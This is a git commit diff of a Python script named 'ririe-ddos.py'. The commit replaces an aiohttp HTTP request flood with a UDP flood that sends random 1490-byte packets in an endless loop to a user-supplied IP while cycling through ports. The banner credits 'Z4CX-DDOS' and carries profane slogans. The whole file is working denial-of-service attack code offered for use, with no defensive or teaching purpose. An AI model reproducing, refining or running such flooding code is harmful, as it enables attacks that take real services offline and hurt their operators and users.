db957e7202ea4c834d9e0603140467a31dd9de52
Kodekeras24 <zhanahmad57@gmail.com>
2024-12-02 00:03:20 +0700

    Update ririe-ddos.py

--- ririe-ddos.py
+++ ririe-ddos.py
@@ -1,73 +1,66 @@
-import socket
-import time
-import asyncio
-import aiohttp
-import fade
+import sys
 import os
-# Clear command prompt based on the operating system
-if os.name == "nt":  # Windows
-    os.system("cls")
-else:  # Unix/Linux/Mac
-    os.system("clear")
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
 
-logo = """
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
 
-       ±± ±± ±±      ±± ±± ±±                      ±±±             
-       ±±       ±±   ±±       ±±                 ±± ±±             
-       ±±       ±±   ±±       ±±                    ±±             
-       ±±       ±±   ±±       ±±                    ±±             
-       ±± ±± ±±      ±± ±± ±±        ________       ±±             
-       ±±   ±±       ±±   ±±         ±± ±± ±±       ±±             
-       ±±     ±±     ±±     ±±                      ±±             
-       ±±       ±±   ±±       ±±                 ±± ±± ±±  
-    
-++ _—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—      
-||                                                                   
-||                                                                 
-||                                            
-||                                               
-||_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_
-"""
-faded_text = fade.fire(logo)
-print(faded_text)
-socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-ask = fade.pinkred("Enter the target IP/URL:")
-url = input(ask)
+os.system("clear")
+print("")
+print("\033[91m||_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_||\033[0m")
+print("\033[91m||                                                                       ||\033[0m")
+print("\033[91m||       ±± ±± ±±        ±± ±± ±±                     ±±±                ||\033[0m")     
+print("\033[91m||       ±±       ±±     ±±       ±±                ±± ±±                ||\033[0m")       
+print("\033[91m||       ±±       ±±     ±±       ±±                   ±±                ||\033[0m")
+print("\033[91m||       ±±       ±±     ±±       ±±                   ±±                ||\033[0m")
+print("\033[33m||       ±± ±± ±±        ±± ±± ±±        ________      ±±                ||\033[0m")
+print("\033[33m||       ±±   ±±         ±±   ±±         ±± ±± ±±      ±±                ||\033[0m")
+print("\033[33m||       ±±     ±±       ±±     ±±                     ±±                ||\033[0m")
+print("\033[33m||       ±±       ±±     ±±       ±±                ±± ±± ±±             ||\033[0m")
+print("\033[34m||                                                                       ||\033[0m")     
+print("\033[97m||      Author  :  Z4CX-DDOS                                             ||\033[0m")
+print("\033[32m||      Github  :  https://github.com/Z4CX-DDOS                          ||\033[0m")
+print("\033[96m||                 Fucking genocide                                      ||\033[0m")
+print("\033[33m||_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_||\033[0m")         
+ip = str(input("\033[93m[\033[93m+\033[92m]IP Target : "))
+port = int(input("\033[92m[\033[95m+\033[92m]Port : "))
+packs = int(input("\033[92m[\033[95m+\033[92m]Packets{0} : "))
+thread = int(input("\033[92m[\033[95m+\033[92m]Threads : "))
 time.sleep(5),
-print("\033[96m                  ⟩⟩  WELCOME \033[0m "),
+print("\033[96m[\033[31m+\033[96m] -------⟩⟩ 15% \033[0m "),
 time.sleep(5),
-print("\033[92m                  ⟩⟩  TO ZONA ATTACK \033[0m "),
+print("\033[92m[\033[31m+\033[92m] -------------⟩⟩ 25% \033[0m "),
 time.sleep(5),
-print("\033[1m                  ⟩⟩  DON'T STOP FIGHT \033[0m "),
+print("\033[94m[\033[31m+\033[94m] ------------------⟩⟩ 50% \033[0m "),
 time.sleep(5),
-print("\033[97m                  ⟩⟩  BECAUSE OF PALESTINE \033[0m "),
+print("\033[97m[\033[31m+\033[97m] ----------------------⟩⟩ 75% \033[0m "),
 time.sleep(5),
-print("\033[95m                  ⟩⟩  STILL BURNING \033[0m "),
+print("\033[95m[\033[31m+\033[95m] -------------------------⟩⟩ 100% \033[0m ")
 time.sleep(5),
+print("\033[96m[\033[31m+\033[96m]        START GO...!! \033[0m "),
 
-async def increment_view_count(session):
-    try:
-        async with session.get(url) as response:
-            if response.status == 200:
-                print("PINGED THIS SHI!")
-            else:
-                print("Failed ping.")
-    except aiohttp.ClientError as e:
-        print("An error occurred:", e)
-
-async def main():
-    connector = aiohttp.TCPConnector(limit=None)  # Enable connection pooling
-    async with aiohttp.ClientSession(connector=connector) as session:
-        tasks = []
-        for _ in range(19999):  # Increase the number of concurrent requests
-            task = asyncio.create_task(increment_view_count(session))
-            tasks.append(task)
-            for i in range(19999):  # Increase the number of concurrent requests
-                task = asyncio.create_task(increment_view_count(session))
-                tasks.append(task)
-            await asyncio.gather(*tasks)
-        await asyncio.gather(*tasks)
-
-
-if __name__ == "__main__":
-    asyncio.run(main())
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print(f"\033[97m[\033[99m+\033[97m]   Sent  \033[94mPacket:::.... " +ip+ "\033[0m" )
+     print("\033[33m———————————————————————————————————————————⟩⟩")
+     print(f"\033[93m[\033[99m+\033[93m]   Attack  \033[95mWebs:::.... " +ip+ "\033[0m" )
+     print("\033[94m———————————————————————————————————————————⟩⟩")
+     print(f"\033[95m[\033[99m+\033[95m]   Request  \033[32mFull:::... " +ip+ "\033[0m" )
+     print("\033[31m———————————————————————————————————————————⟩⟩")
+     if port == 65534:
+       port = 1
